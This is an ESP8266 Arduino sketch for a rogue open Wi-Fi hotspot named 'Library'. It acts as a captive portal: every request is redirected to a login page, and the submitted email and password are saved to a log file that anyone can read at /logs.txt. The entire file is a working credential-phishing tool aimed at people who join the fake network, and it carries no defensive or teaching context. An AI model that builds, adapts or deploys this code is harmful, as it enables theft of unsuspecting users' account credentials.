#include <ESP8266WiFi.h>
#include <ESP8266mDNS.h>
#include <ESP8266WebServer.h>
#include "loginpage.h"
#include "postpage.h"


const IPAddress apIp(192, 168, 0, 1);

ESP8266WebServer server(80); // server port 80

File file;

void handleRoot(){
  String s1 = loginPage;
  server.send(200, "text/html", s1);
}

void postClient(){
  file = SPIFFS.open("/logs.txt", "w");
  file.print(" Email: " + server.arg("email"));
  file.print(" Password: " + server.arg("password"));
  String s2 = postPage;
  File file1 = SPIFFS.open("/connect.htm", "r");
  server.streamFile(file1, "text/html");
  file.close();
//  server.send(200, "text/html", s2);
}

void notFound(){
  server.sendHeader("Location", "http://192.168.0.1/", true);  // redirect to root page
  server.send(302, "text/plain", "");
}

void httpLog(){
  file.seek(0, SeekSet);
  server.streamFile(file, "text/plain");
  file.seek(0, SeekEnd);
}


void setup(void)
{
  Serial.begin(115200);
  file = SPIFFS.open("/logs.txt", "a+");
  
//  WiFi.mode(WIFI_NONE_SLEEP)
  WiFi.setSleepMode(WIFI_NONE_SLEEP);
//  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Library", "");
  
  Serial.println("softap");
  Serial.println("");
//  Serial.println(WiFi.softAPIP());

  if (MDNS.begin("ESP")) { //esp.local/
    Serial.println("MDNS responder started");
  }

  server.on("/", handleRoot);
  server.on("/connect", postClient);
  server.on("/logs.txt", httpLog);
  server.onNotFound(notFound);
  
  server.begin();  // it will start webserver
}


void loop()
{
  server.handleClient();
}
